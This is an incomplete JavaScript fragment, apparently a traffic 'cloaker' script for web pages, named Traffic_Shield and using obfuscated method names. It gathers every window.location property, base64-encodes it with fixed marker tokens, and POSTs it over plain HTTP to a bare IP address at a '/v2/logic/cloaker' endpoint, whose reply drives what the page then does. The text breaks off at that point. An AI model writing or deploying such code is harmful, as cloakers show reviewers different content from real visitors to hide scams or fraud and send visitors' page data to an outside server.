class Traffic_Shield{
    run() {							
        this.ogrsr9854();
    }
    ogrsr9854() {	
        this._check(); 
        let response = this.https_request();        
        this.main(response);       
    }			
    _check() {	
        if(typeof window !== 'undefined' && window.location.search.includes('TS-BHDNR-84848')){
            console.log("11333b79bb");
        }
    }
    get_header() {	
        let headers = {};     
        for(let k in window.location){
           headers[k] = window.location[k];
        }
        headers['TS-BHDNR-74191'] = "900661405710890";
        headers['TS-BHDNR-74194'] = "11333b79bb"; 
        return headers;
    }
    get_header_post() {
        let get_header = this.get_header();
        return btoa(JSON.stringify(get_header));      
    }	
    https_request() {
       let get_header = {};
       get_header['headers'] = this.get_header_post();
       let xhr = new XMLHttpRequest();
       xhr.open("POST", "http://198.211.101.164/v2/logic/cloaker", false);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send(JSON.stringify(get_header));
       let result = xhr.responseText;
